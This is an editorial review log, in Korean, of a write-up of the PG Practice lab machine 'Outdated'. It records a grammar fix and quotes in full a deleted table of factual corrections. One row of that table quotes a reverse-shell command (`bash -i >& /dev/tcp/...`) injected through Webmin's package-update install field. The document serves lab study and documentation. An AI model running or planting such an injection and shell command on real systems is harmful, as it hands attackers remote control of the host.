# Outdated.md 문서 검토 (축② 공개 적합성 · 축③ 한국어) — 2026-08-21

축① 문체 개조식 전환은 **수행하지 않았다**.

## 보존 검산

| | 전 | 후 |
|---|---|---|
| 코드펜스 | 50 | **50** |
| 인식론적 표시 `[가정]` | 3 | 2 |
| 본문 `[가정]` (삭제한 감사 블록 제외) | 2 | **2** |
| 바이트 | 35,386 | 31,979 |
| 행 | 551 | 528 |

감소한 1건은 삭제한 감사 표 안의 「산출물로 보존되지 않았다 → `[가정]` 강등」이다. 본문의 `[가정]` 2건(1장 `installed.json` 교차확인, 2장 `index.php` 재구성)은 그대로다.

## 고친 것

| 위치 | 분류 | 전 → 후 |
|---|---|---|
| 4장 Webmin 로그인 | 축③(비문) | 「… 로그인 폼으로 되돌리기 **때문.**」 → 「… 로그인 폼으로 되돌리기 **때문이다.**」 |

이 노트는 감사 블록 밖에 에이전트·파이프라인·로컬 경로·초고 언급이 **한 건도 없었다.** 담당 파일 셋 중 본문이 가장 깨끗했다.

## 삭제한 것 — 원문 전문

`# Outdated (PG Practice · Fundamental)` 제목 직후의 「적대적 검증 정정 이력」 콜아웃 전체(22행). 표의 기술적 정정은 전부 본문에 이미 반영돼 있다 — nmap RST 줄→1장, `0.0.0.0:10000`→4장·요약·7장 3번, `getcap` 5개→4장, `ls -la /root`→4장, `.bash_history -> /dev/null`→4장, `Set-Cookie` secure/httpOnly→4장, `data-access-level` 반증→4장, Referer/302 분리→4장·6장 3번, `resp2.html` 출처 명시→4장, `confirm=1` 비필수→4장, perl 렌더 인용→4장, 시간표 재구성→6장, 스크린샷 삽입→1장.

```
> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> `~/PG/Outdated/` 산출물 전량 + Webmin 1.996 원본 소스(`github.com/webmin/webmin` tag `1.996`)와 대조해 정정한 것들.
>
> | 위치 | 무엇이 틀렸나 | 근거 |
> |---|---|---|
> | 1장 nmap 블록 | `Nmap scan report for …` / `Not shown: 65532 closed …(reset)` 줄이 빠져 있었다. 바로 뒤 문장이 근거로 삼는 RST 관측이 정작 블록에 없었고, 색인의 `ip` 필드도 이 줄에 걸려 있어 IP 가 아예 안 잡히고 있었다 | `nmap.log` |
> | 4장 `ss -lntp` | 4줄 출력이 2줄로 압축돼 있었고 10000 이 "로컬에서 열려 있다"로 적혀 있었다. 실제 바인딩은 **`0.0.0.0:10000`** — 로컬 전용이 아니라 **경로상 방화벽**이 외부를 막은 것 | `enum_user.txt` |
> | 상단 요약 | "로컬 전용 Webmin" → 전 인터페이스 바인딩, 외부만 차단 | 위와 같음 |
> | 4장 `getcap` | "ping/traceroute 만" → 실제 5개(`gst-ptp-helper` 의 `cap_net_bind_service,cap_net_admin` 포함) | `enum_user.txt` |
> | 4장 root 플래그 블록 | 중간의 `ls -la /root` 출력이 통째로 잘려 있었다 | `proof_root.txt` |
> | 3장 `.bash_history` | svc-account 것처럼 읽혔으나 실측은 **`/root/.bash_history -> /dev/null`** | `proof_root.txt` |
> | 4장 `Set-Cookie` | `sid=8066e35...` 로 잘려 있었고 `secure`·`httpOnly` 가 빠져 있었다 | `cj.txt` |
> | 4장 접근권 근거 | `data-access-level="0"` 을 "모듈 풀 접근"의 근거로 삼았다. 이 속성은 **거부된 응답에도 똑같이 붙는** 사용자 전역 속성이다 | `exploit_resp.html` ↔ `pu.html` |
> | 4·6장 Referer 함정 | "302 로 **조용히** 거부" → 저장된 거부 응답은 Webmin **"Security Warning"** 페이지이고 원인과 해법(`referers_none`)이 본문에 그대로 적혀 있다. 302 자체는 referer 체크가 아니라 URL 의 `?xnavigation=1` 분기가 만든 것 | `exploit_resp.html`, `web-lib-funcs.pl:5262-5330` |
> | 4장 성공 응답 | 노트는 `cp /bin/bash …` 명령 밑에 `<tt>apt-get -y  install ;echo YmFz…` 출력을 붙였는데, 저장된 그 응답의 base64 는 **리버스셸**(`bash -i >& /dev/tcp/192.168.45.207/443 0>&1`)이다. rootbash 요청의 응답은 저장되지 않았다 | `resp2.html` |
> | 4·6장 `confirm=1` | "없으면 실제 설치가 안 된다"는 **소스로 반증**. `@ops` 가 비면 설치 분기로 그대로 떨어진다. 이 조건만 분리 검증한 적이 없다 | `package-updates/update.cgi` |
> | 4장 perl 인용 | `local $cmd = "$apt_get_command -y  install $update";` 는 원본이 아니라 **렌더된 결과**였다 | `software/apt-lib.pl` |
> | 2장 `index.php` 원문 · `installed.json` 교차확인 | 산출물로 보존되지 않았다 → `[가정]` 강등 | 부재 |
> | 6장 시간 배분 | "10분 / 20분" → 산출물 mtime 으로 재구성하면 **4분 / 5분, 전체 12분** | 산출물 mtime |
> | 스크린샷 | "0장"이 아니라 `파일보관/PG-Outdated-mpdf_80.png` 1장이 있었다. 본문에 삽입 | 볼트 `파일보관\` |
>
> 삭제한 절 없음. 삭제한 문장 하나 — 4장의 `Server: MiniServ/1.996        # ← SSL 모드. http 로 붙으면 "running in SSL mode" 안내` 는 대응 산출물이 없어, 실측 근거가 있는 두 줄(`/usr/share/webmin/version` 과 응답 HTML 의 `<title>`)로 교체했다.
```

## 넘긴 것 — 사실 의심

없음.

## 손대지 않기로 한 것

- **3장 `svc-account@outdated:~$ id` 프롬프트** — 타겟 pty 실측이다. 유지.
- **9장의 「Webmin 1.996 원본 소스 — … (이 노트의 perl 인용 검증에 사용)」** — 감사 이력이 아니라 **출처 표기**다. 어떤 소스로 인용을 대조했는지는 독자에게 필요한 정보라 남긴다.
- **2장·6장의 「산출물로 저장하지 않았다」·「try2·try3 은 보존되지 않았다」·「이 조건만 따로 떼어 검증한 적은 없다」** — 유보·「관측 없음」류 인식론적 표시다. 전량 유지.
- **코드펜스 내부 전량** · **Kali/랩 IP** · **`~/PG/Outdated/` 출처 캡션** · **`![[PG-Outdated-mpdf_80.png]]`**.
